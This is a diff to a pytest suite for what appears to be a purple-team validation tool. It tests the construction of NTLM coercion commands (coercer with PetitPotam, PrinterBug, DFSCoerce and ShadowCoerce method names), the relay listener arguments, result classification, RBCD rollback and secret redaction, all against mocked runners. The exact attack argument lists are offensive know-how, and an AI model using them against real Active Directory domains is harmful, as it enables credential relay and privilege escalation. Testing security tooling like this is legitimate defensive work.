@@ -22,6 +22,8 @@ from __future__ import annotations
 import json
 from pathlib import Path
 
+import pytest
+
 from purplesploit.validation.config import ValidationConfig
 from purplesploit.validation.findings import map_finding
 from purplesploit.validation.executors import get_executor, is_implemented
@@ -231,7 +233,8 @@ def test_coercion_operator_override_method_and_listener(tmp_path):
     get_executor("COERCION").run(
         _ctx(cfg, runner, tmp_path, pm), _coerce_finding(),
         overrides={"method": "petitpotam", "listener_host": "10.0.0.250"})
-    trig = next(c for c in runner.calls if Path(c[0]).name == "PetitPotam.py")
+    trig = next(c for c in runner.calls if Path(c[0]).name == "coercer")
+    assert trig[trig.index("--filter-method-name") + 1] == "EfsRpcOpenFileRaw"
     assert "10.0.0.250" in trig                  # coercion points at the operator listener
 
 
@@ -240,8 +243,8 @@ def test_coercion_shadowcoerce_argv():
     from purplesploit.validation.executors.coercion import coercion_trigger_argv, COERCION_METHODS
     assert "shadowcoerce" in COERCION_METHODS
     argv = coercion_trigger_argv("shadowcoerce", "dc01", "10.0.0.250", _cfg())
-    assert argv[0] == "coercer" and "--filter-protocol-name" in argv
-    assert argv[argv.index("--filter-protocol-name") + 1] == "MS-FSRVP"   # ShadowCoerce = MS-FSRVP
+    assert argv[:2] == ["coercer", "coerce"]
+    assert argv[argv.index("--filter-method-name") + 1] == "IsPathShadowCopied"  # MS-FSRVP
     assert "dc01" in argv and "10.0.0.250" in argv
 
 
@@ -304,8 +307,10 @@ def test_relay_smb_sam_no_loot_is_inconclusive(tmp_path):
                tool_timeout_s=0)
     pm = _FakePM(reads=[""], poll_codes=[None])  # no loot file ever appears
     receipt = get_executor("NTLM-RELAY").run(_ctx(cfg, _KeyRunner(), tmp_path, pm), _relay_finding())
-    assert receipt["complete"] is False and receipt["terminal_fact"] is None
-    assert "relay_no_loot" in receipt["errors"]
+    assert receipt["complete"] is False
+    assert receipt["terminal_fact"]["classification"] == "no_auth_landed"
+    assert receipt["terminal_fact"]["ok"] is False
+    assert "no_auth_landed" in receipt["errors"]
 
 
 def test_relay_ldap_rbcd_proved_with_verified_rollback(tmp_path):
@@ -471,3 +476,218 @@ def test_unconstrained_no_secret_in_receipt(tmp_path):
     assert "Unc0nstr@ined!" not in blob            # operator password never stored
     assert "KRBTGTsecretnthash0000000000000" not in blob   # DCSync krbtgt hash never read in
     assert ".ccache" not in blob                   # captured-ticket path never stored
+
+
+# ============================================================ Relay R1 regressions
+@pytest.mark.parametrize("method,vector", [
+    ("petitpotam", "EfsRpcOpenFileRaw"),
+    ("printerbug", "RpcRemoteFindFirstPrinterChangeNotification"),
+    ("dfscoerce", "NetrDfsRemoveStdRoot"),
+    ("shadowcoerce", "IsPathShadowCopied"),
+])
+@pytest.mark.parametrize("use_hash", [False, True])
+def test_coercion_single_vectors_use_coercer(method, vector, use_hash):
+    from purplesploit.validation.executors.coercion import coercion_trigger_argv
+    from purplesploit.validation.executors.base import redact_argv
+    secret = "aad3b435:deadbeef" if use_hash else "P@ssw0rd!"
+    cfg = _cfg(nt_hash=secret) if use_hash else _cfg(password=secret)
+    flag = "-hashes" if use_hash else "-p"
+    argv = coercion_trigger_argv(method, "dc01", "10.0.0.250", cfg)
+    assert argv == [
+        "coercer", "coerce", "-u", cfg.username, "-d", cfg.domain, flag, secret,
+        "--dc-ip", cfg.dc_ip, "-l", "10.0.0.250", "-t", "dc01",
+        "--filter-method-name", vector, "--always-continue",
+    ]
+    assert not any(arg.endswith(".py") for arg in argv)
+    assert secret not in redact_argv(argv)
+
+
+def test_coercion_auto_remains_unfiltered_multiplexer():
+    from purplesploit.validation.executors.coercion import coercion_trigger_argv
+    argv = coercion_trigger_argv("auto", "dc01", "10.0.0.250", _cfg())
+    assert argv[:2] == ["coercer", "coerce"]
+    assert not any(arg.startswith("--filter-") for arg in argv)
+    assert "--always-continue" in argv
+    assert argv[argv.index("--dc-ip") + 1] == _cfg().dc_ip
+
+
+def _relay_runner(trigger=None):
+    return _KeyRunner({
+        # Coercer's green ERROR_BAD_NETPATH is not a trigger failure.
+        "coercer": trigger if trigger is not None else RunResult(1, stdout="ERROR_BAD_NETPATH"),
+        "impacket-rbcd:flush": RunResult(0, stdout="Delegation rights flushed successfully"),
+        "impacket-rbcd:read": RunResult(
+            0, stdout="Accounts allowed to act on behalf of other identity: has no entries"),
+    })
+
+
+def _assert_relay_outcome(receipt, classification):
+    succeeded = classification == "action_succeeded"
+    assert receipt["terminal_fact"]["classification"] == classification
+    assert receipt["terminal_fact"]["ok"] is succeeded
+    assert receipt["complete"] is succeeded
+    assert receipt["terminal_fact"]["proof_token"]
+    assert receipt["terminal_fact"]["mode_proven"] is False
+    assert receipt["errors"] == ([] if succeeded else [classification])
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+@pytest.mark.parametrize("trigger", [
+    RunResult(None, timed_out=True, error="timeout"),
+    RunResult(None, error="missing tool"),
+])
+def test_relay_classifies_coerce_not_fired(tmp_path, mode, trigger):
+    pm = _FakePM(reads=["[*] Servers started, waiting for connections"])
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(trigger), tmp_path, pm),
+        _relay_finding(), overrides={"mode": mode})
+    _assert_relay_outcome(receipt, "coerce_not_fired")
+    assert next(s for s in receipt["steps"] if s["name"] == "coerce_trigger")["ok"] is False
+    assert pm.stopped == ["h1"]
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+def test_relay_classifies_no_auth_landed(tmp_path, mode):
+    pm = _FakePM(reads=["[*] Servers started, waiting for connections"])
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
+        _relay_finding(), overrides={"mode": mode})
+    _assert_relay_outcome(receipt, "no_auth_landed")
+    assert next(s for s in receipt["steps"] if s["name"] == "coerce_trigger")["ok"] is True
+    assert receipt["mutation"]["applied"] is False
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+@pytest.mark.parametrize("marker", [
+    "Authenticating against {protocol}://srv02 as NORTH/DC01$ SUCCEED",
+    "authenticating AGAINST {protocol}://srv02 as NORTH/DC01$ SUCCEED",
+    "SMBD-Thread-3: Connection from 10.0.0.11",
+])
+def test_relay_classifies_action_denied(tmp_path, mode, marker):
+    protocol = "ldap" if mode == "ldap_rbcd" else "smb"
+    pm = _FakePM(reads=[marker.format(protocol=protocol) + "\nAccess denied"])
+    runner = _relay_runner()
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), runner, tmp_path, pm),
+        _relay_finding(), overrides={"mode": mode})
+    _assert_relay_outcome(receipt, "action_denied")
+    assert receipt["mutation"]["applied"] is False
+    assert [c[0] for c in runner.calls] == ["coercer"]  # no write -> no rollback
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+def test_relay_classifies_action_succeeded(tmp_path, mode):
+    def loot_on_start(argv, cwd):
+        if mode == "smb_sam":
+            _write_loot(cwd)
+    pm = _FakePM(reads=["Delegation rights modified successfully!" if mode == "ldap_rbcd"
+                       else "Dumping SAM hashes"], on_start=loot_on_start)
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
+        _relay_finding(), overrides={"mode": mode})
+    _assert_relay_outcome(receipt, "action_succeeded")
+    assert receipt["terminal_fact"]["kind"] == (
+        "rbcd_access" if mode == "ldap_rbcd" else "replication_dump")
+    assert receipt["mutation"]["applied"] is (mode == "ldap_rbcd")
+    assert receipt["mutation"]["rollback"]["verified"] is (mode == "ldap_rbcd")
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+def test_relay_partial_signal_timeout_is_inconclusive(tmp_path, mode):
+    pm = _FakePM(reads=["SMBD-Thread-3: Authenticating"])
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
+        _relay_finding(), overrides={"mode": mode})
+    _assert_relay_outcome(receipt, "inconclusive")
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+def test_relay_listener_only_serves_smb(tmp_path, mode):
+    pm = _FakePM()
+    get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
+        _relay_finding(), overrides={"mode": mode})
+    argv, = pm.started
+    assert {"--no-http-server", "--no-wcf-server", "--no-raw-server", "--no-rpc-server",
+            "--no-winrm-server", "--no-mssql-server", "--no-rdp-server"} <= set(argv)
+    assert "--no-smb-server" not in argv
+    assert argv[argv.index("-t") + 1].startswith("ldap://" if mode == "ldap_rbcd" else "smb://")
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+@pytest.mark.parametrize("classification", [
+    "coerce_not_fired", "no_auth_landed", "action_denied", "action_succeeded", "inconclusive",
+])
+def test_relay_secret_payload_never_enters_receipt_or_token(tmp_path, mode, classification):
+    tokens = []
+    for index, payload in enumerate([
+        "aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef P@ssw0rd!",
+        "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb:cafebabecafebabecafebabecafebabe DifferentPassword!",
+    ]):
+        out_dir = tmp_path / str(index)
+        marker = {
+            "coerce_not_fired": "",
+            "no_auth_landed": "[*] Servers started",
+            "action_denied": "Authenticating against ldap://srv02 as NORTH/DC01$ SUCCEED",
+            "action_succeeded": "Delegation rights modified successfully!",
+            "inconclusive": "SMBD-Thread-3: Authenticating",
+        }[classification]
+        if classification == "action_succeeded" and mode == "smb_sam":
+            _write_loot(out_dir).write_text(payload, encoding="utf-8")
+        trigger = RunResult(None, stdout=payload, stderr=payload, timed_out=True, error=payload) \
+            if classification == "coerce_not_fired" else RunResult(1, stdout=payload, stderr=payload)
+        runner = _relay_runner(trigger)
+        runner.script["impacket-rbcd:flush"].stdout += "\n" + payload
+        runner.script["impacket-rbcd:read"].stdout += "\n" + payload
+        pm = _FakePM(reads=[marker + "\n" + payload])
+        receipt = get_executor("NTLM-RELAY").run(
+            _ctx(_cfg(tool_timeout_s=0, password="P@ssw0rd!"), runner, out_dir, pm),
+            _relay_finding(), overrides={"mode": mode})
+        _assert_relay_outcome(receipt, classification)
+        blob = json.dumps(receipt)
+        for secret in payload.replace(":", " ").split() + ["P@ssw0rd!"]:
+            assert secret not in blob
+        tokens.append(receipt["terminal_fact"]["proof_token"])
+    assert tokens[0] == tokens[1]
+
+
+@pytest.mark.parametrize("proven_mode", ["smb_sam", "ldap_rbcd"])
+def test_relay_mode_proven_is_independent_of_class_flag(tmp_path, monkeypatch, proven_mode):
+    from purplesploit.validation.executors.ntlm_relay import MODE_PROVEN
+    executor = get_executor("NTLM-RELAY")
+    monkeypatch.setattr(executor, "verified_recipe", True)
+    monkeypatch.setitem(MODE_PROVEN, proven_mode, True)
+    for mode in ("smb_sam", "ldap_rbcd"):
+        receipt = executor.run(
+            _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path / mode, _FakePM()),
+            _relay_finding(), overrides={"mode": mode})
+        assert receipt["terminal_fact"]["mode_proven"] is (mode == proven_mode)
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+def test_relay_classifies_session_from_final_listener_output(tmp_path, mode):
+    # The poll sees no signal; stop drains the session marker before classification.
+    pm = _FakePM(reads=["", "Authenticating against smb://srv02 as NORTH/DC01$ SUCCEED"])
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
+        _relay_finding(), overrides={"mode": mode})
+    _assert_relay_outcome(receipt, "action_denied")
+
+
+def test_relay_rbcd_success_from_final_listener_output(tmp_path):
+    pm = _FakePM(reads=["", "Delegation rights modified successfully!"])
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm),
+        _relay_finding(), overrides={"mode": "ldap_rbcd"})
+    _assert_relay_outcome(receipt, "action_succeeded")
+    assert receipt["mutation"]["rollback"]["verified"] is True
+
+
+def test_relay_rbcd_observed_after_failed_trigger_still_rolls_back(tmp_path):
+    pm = _FakePM(reads=["Delegation rights modified successfully!"])
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(RunResult(None, timed_out=True)), tmp_path, pm),
+        _relay_finding(), overrides={"mode": "ldap_rbcd"})
+    _assert_relay_outcome(receipt, "coerce_not_fired")
+    assert receipt["mutation"]["applied"] is True
+    assert receipt["mutation"]["rollback"]["verified"] is True
